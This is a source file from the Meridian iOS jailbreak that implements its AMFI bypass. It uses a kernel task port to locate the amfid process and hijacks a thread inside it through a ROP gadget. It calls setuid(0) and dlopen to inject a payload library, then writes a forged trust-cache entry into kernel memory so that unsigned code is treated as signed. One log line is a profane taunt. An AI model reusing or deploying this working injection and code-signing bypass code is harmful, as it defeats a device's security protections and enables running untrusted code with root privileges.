//
//  amfi.m
//  Meridian
//
//  Created by Ben Sparkes on 19/12/2017.
//  Copyright © 2017 Ben Sparkes. All rights reserved.
//

#import "patchfinder64.h"
#import "kernel.h"
#import "amfi.h"
#import "helpers.h"
#import "ViewController.h"
#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonDigest.h>
#import <mach-o/loader.h>
#import <sys/stat.h>
#import <dlfcn.h>

#define MAX_REMOTE_ARGS 8

#define REMOTE_LITERAL(val) &(arg_desc){ARG_LITERAL, (uint64_t)val, (uint64_t)0}
#define REMOTE_CSTRING(str) &(arg_desc){ARG_BUFFER, (uint64_t)str, (uint64_t)(strlen(str)+1)}

extern void _pthread_set_self(pthread_t p);

enum arg_type {
    ARG_LITERAL,
    ARG_BUFFER,
    ARG_BUFFER_PERSISTENT, // don't free the buffer after the call
    ARG_OUT_BUFFER,
    ARG_INOUT_BUFFER
};

typedef struct _arg_desc {
    uint64_t type;
    uint64_t value;
    uint64_t length;
} arg_desc;

task_t tfp0;
mach_port_t amfiTask;
uint64_t trust_cache;
uint64_t amficache;
uint64_t blr_x19_addr = 0;

void init_amfi(task_t task_for_port0) {
    tfp0 = task_for_port0;
    trust_cache = find_trustcache();
    amficache = find_amficache();
    
    term_kernel();
    
    printf("trust_cache = 0x%llx \n", trust_cache);
    printf("amficache = 0x%llx \n", amficache);
}

uint64_t find_gadget_candidate(char** alternatives, size_t gadget_length) {
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            NSLog(@"[inject] found at: %llx\n", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t find_blr_x19_gadget() {
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = { blr_x19, NULL };
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

// Credits to theninjaprawn & Ian Beer for the amfid patch
uint64_t call_remote(mach_port_t task_port, void* fptr, int n_params, ...) {
    if (n_params > MAX_REMOTE_ARGS || n_params < 0){
        NSLog(@"[inject] unsupported number of arguments to remote function (%d)\n", n_params);
        return 0;
    }
    
    kern_return_t err;
    
    uint64_t remote_stack_base = 0;
    uint64_t remote_stack_size = 4*1024*1024;
    
    remote_stack_base = remote_alloc(task_port, remote_stack_size);
    
    uint64_t remote_stack_middle = remote_stack_base + (remote_stack_size/2);
    
    // create a new thread in the target
    // just using the mach thread API doesn't initialize the pthread thread-local-storage
    // which means that stuff which relies on that will crash
    // we can sort-of make that work by calling _pthread_set_self(NULL) in the target process
    // which will give the newly created thread the same TLS region as the main thread
    
    
    _STRUCT_ARM_THREAD_STATE64 thread_state = {0};
    mach_msg_type_number_t thread_stateCnt = sizeof(thread_state)/4;
    
    // we'll start the thread running and call _pthread_set_self first:
    thread_state.__sp = remote_stack_middle;
    thread_state.__pc = (uint64_t)_pthread_set_self;
    
    // set these up to put us into a predictable state we can monitor for:
    uint64_t loop_lr = find_blr_x19_gadget();
    thread_state.__x[19] = loop_lr;
    thread_state.__lr = loop_lr;
    
    // set the argument to NULL:
    thread_state.__x[0] = 0;
    
    mach_port_t thread_port = MACH_PORT_NULL;
    
    err = thread_create_running(task_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, thread_stateCnt, &thread_port);
    if (err != KERN_SUCCESS){
        NSLog(@"[inject] error creating thread in child: %s\n", mach_error_string(err));
        return 0;
    }
    NSLog(@"[inject] new thread running in child: %x\n", thread_port);
    
    // wait for it to hit the loop:
    while(1) {
        // monitor the thread until we see it's in the infinite loop indicating it's done:
        err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, &thread_stateCnt);
        if (err != KERN_SUCCESS){
            NSLog(@"[inject] error getting thread state: %s\n", mach_error_string(err));
            return 0;
        }
        
        if (thread_state.__pc == loop_lr && thread_state.__x[19] == loop_lr){
            // thread has returned from the target function
            break;
        }
    }
    
    // the thread should now have pthread local storage
    // pause it:
    
    err = thread_suspend(thread_port);
    if (err != KERN_SUCCESS){
        NSLog(@"[inject] unable to suspend target thread\n");
        return 0;
    }
    
    // set up for the actual target call:
    thread_state.__sp = remote_stack_middle;
    thread_state.__pc = (uint64_t)fptr;
    
    // set these up to put us into a predictable state we can monitor for:
    thread_state.__x[19] = loop_lr;
    thread_state.__lr = loop_lr;
    
    va_list ap;
    va_start(ap, n_params);
    
    arg_desc* args[MAX_REMOTE_ARGS] = {0};
    
    uint64_t remote_buffers[MAX_REMOTE_ARGS] = {0};
    
    for (int i = 0; i < n_params; i++){
        arg_desc* arg = va_arg(ap, arg_desc*);
        
        args[i] = arg;
        
        switch(arg->type){
            case ARG_LITERAL:
            {
                thread_state.__x[i] = arg->value;
                break;
            }
                
            case ARG_BUFFER:
            case ARG_BUFFER_PERSISTENT:
            case ARG_INOUT_BUFFER:
            {
                uint64_t remote_buffer = alloc_and_fill_remote_buffer(task_port, arg->value, arg->length);
                remote_buffers[i] = remote_buffer;
                thread_state.__x[i] = remote_buffer;
                break;
            }
                
            case ARG_OUT_BUFFER:
            {
                uint64_t remote_buffer = remote_alloc(task_port, arg->length);
                // NSLog(@"allocated a remote out buffer: %llx\n", remote_buffer);
                remote_buffers[i] = remote_buffer;
                thread_state.__x[i] = remote_buffer;
                break;
            }
                
            default:
            {
                NSLog(@"[inject] invalid argument type!\n");
            }
        }
    }
    
    va_end(ap);
    
    err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, thread_stateCnt);
    if (err != KERN_SUCCESS){
        NSLog(@"[inject] error setting new thread state: %s\n", mach_error_string(err));
        return 0;
    }
    NSLog(@"[inject] thread state updated in target: %x\n", thread_port);
    
    err = thread_resume(thread_port);
    if (err != KERN_SUCCESS){
        NSLog(@"[inject] unable to resume target thread\n");
        return 0;
    }
    
    while(1) {
        // monitor the thread until we see it's in the infinite loop indicating it's done:
        err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, &thread_stateCnt);
        if (err != KERN_SUCCESS){
            NSLog(@"error getting thread state: %s\n", mach_error_string(err));
            return 0;
        }
        
        if (thread_state.__pc == loop_lr/*&& thread_state.__x[19] == loop_lr*/){
            // thread has returned from the target function
            break;
        }
        
        // thread isn't in the infinite loop yet, let it continue
    }
    
    // deallocate the remote thread
    err = thread_terminate(thread_port);
    if (err != KERN_SUCCESS){
        NSLog(@"[inject] failed to terminate thread\n");
        return 0;
    }
    mach_port_deallocate(mach_task_self(), thread_port);
    
    // handle post-call argument cleanup/copying:
    for (int i = 0; i < MAX_REMOTE_ARGS; i++){
        arg_desc* arg = args[i];
        if (arg == NULL) {
            break;
        }
        switch (arg->type) {
            case ARG_BUFFER:
            {
                remote_free(task_port, remote_buffers[i], arg->length);
                break;
            }
                
            case ARG_INOUT_BUFFER:
            case ARG_OUT_BUFFER:
            {
                // copy the contents back:
                remote_read_overwrite(task_port, remote_buffers[i], arg->value, arg->length);
                remote_free(task_port, remote_buffers[i], arg->length);
                break;
            }
        }
    }
    
    uint64_t ret_val = thread_state.__x[0];
    
    NSLog(@"[inject] remote function call return value: %llx\n", ret_val);
    
    // deallocate the stack in the target:
    remote_free(task_port, remote_stack_base, remote_stack_size);
    
    return ret_val;
}

int patch_amfi() {
    {
        // copy some files
        printf("[amfi] copying in our payload \n");
        
        unlink("/meridian/amfid_payload.dylib");
        cp(bundled_file("amfid_payload.dylib"), "/meridian/amfid_payload.dylib");
        chmod("/meridian/amfid_payload.dylib", 0777);
    }
    
    {
        // trust our payload
        printf("[amfi] trusting our payload \n");
        inject_trust("/meridian/amfid_payload.dylib");
    }
    
    printf("finding amfid pid... \n");
    
    uint32_t amfi_pid = 0;
    uint64_t proc = rk64(kernprocaddr + 0x08);
    while (proc) {
        uint32_t pid = (uint32_t)rk32(proc + 0x10);
        
        char name[40] = {0};
        tfp0_kread(proc + 0x268 + 0x4, name, 20);
        
        if (strstr(name, "amfid")) {
            amfi_pid = pid;
        }
        
        proc = rk64(proc + 0x08);
    }
    
    printf("found amfid pid: %d \n", amfi_pid);
    
    if (amfi_pid == 0) {
        printf("amfi pid was not found :( \n");
        return 1;
    }
    
    task_t remoteTask = task_for_pid_workaround(amfi_pid);
    if (remoteTask == MACH_PORT_NULL) {
        NSLog(@"[inject] Failed to get task for amfid!");
        return 2;
    }
    
    amfiTask = (mach_port_t)remoteTask;
    
    call_remote(remoteTask, setuid, 1, REMOTE_LITERAL(0));
    
    NSLog(@"[inject] amfid uid is now 0 - injecting our dylib");
    
    call_remote(remoteTask, dlopen, 2, REMOTE_CSTRING("/meridian/amfid_payload.dylib"), REMOTE_LITERAL(RTLD_NOW));
    uint64_t error = call_remote(remoteTask, dlerror, 0);
    if (error == 0) {
        NSLog(@"[inject] No error occured! Payload injected successfully!");
    } else {
        uint64_t len = call_remote(remoteTask, strlen, 1, REMOTE_LITERAL(error));
        char* local_cstring = malloc(len +  1);
        remote_read_overwrite(remoteTask, error, (uint64_t)local_cstring, len+1);
        
        NSLog(@"[inject] Error: %s", local_cstring);
        log_message([NSString stringWithFormat:@"amfi error: %s", local_cstring]);
        return 3;
    }
    
    printf("[amfi] get fucked ya silyl little cunT ;) \n");
    return 0;
}

// creds to stek29(?)
void inject_trust(const char *path) {
    typedef char hash_t[20];
    
    struct trust_chain {
        uint64_t next;
        unsigned char uuid[16];
        unsigned int count;
        hash_t hash[1];
    };
    
    struct trust_chain fake_chain;
    
    fake_chain.next = rk64(trust_cache);
    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
    fake_chain.count = 1;
    
    uint8_t *codeDir = getCodeDirectory(path);
    if (codeDir == NULL) {
        printf("[amfi] was given null code dir for %s! \n", path);
        return;
    }
    
    uint8_t *hash = getSHA1(codeDir);
    memmove(fake_chain.hash[0], hash, 20);
    
    free(hash);
    
    uint64_t kernel_trust = 0;
    mach_vm_allocate(tfp0, &kernel_trust, sizeof(fake_chain), VM_FLAGS_ANYWHERE);
    
    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
    wk64(trust_cache, kernel_trust);
    
    printf("[amfi] signed %s \n", path);
}

// creds to nullpixel
uint8_t *getCodeDirectory(const char* name) {
    FILE* fd = fopen(name, "r");
    
    struct mach_header_64 mh;
    fread(&mh, sizeof(struct mach_header_64), 1, fd);
    
    long off = sizeof(struct mach_header_64);
    for (int i = 0; i < mh.ncmds; i++) {
        const struct load_command cmd;
        fseek(fd, off, SEEK_SET);
        fread(&cmd, sizeof(struct load_command), 1, fd);
        if (cmd.cmd == 0x1d) {
            uint32_t off_cs;
            fread(&off_cs, sizeof(uint32_t), 1, fd);
            uint32_t size_cs;
            fread(&size_cs, sizeof(uint32_t), 1, fd);
            
            uint8_t *cd = malloc(size_cs);
            fseek(fd, off_cs, SEEK_SET);
            fread(cd, size_cs, 1, fd);
            
            return cd;
        } else {
            off += cmd.cmdsize;
        }
    }
    
    return NULL;
}

// creds to nullpixel
uint8_t *getSHA1(uint8_t* code_dir) {
    uint8_t *out = malloc(CC_SHA1_DIGEST_LENGTH);
    
    uint32_t* code_dir_int = (uint32_t*)code_dir;
    
    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
            realsize = swap_uint32(code_dir_int[j+1]);
            code_dir += 4*j;
        }
    }
    
    CC_SHA1(code_dir, realsize, out);
    
    return out;
}

uint32_t swap_uint32(uint32_t val) {
    val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF);
    return (val << 16) | (val >> 16);
}
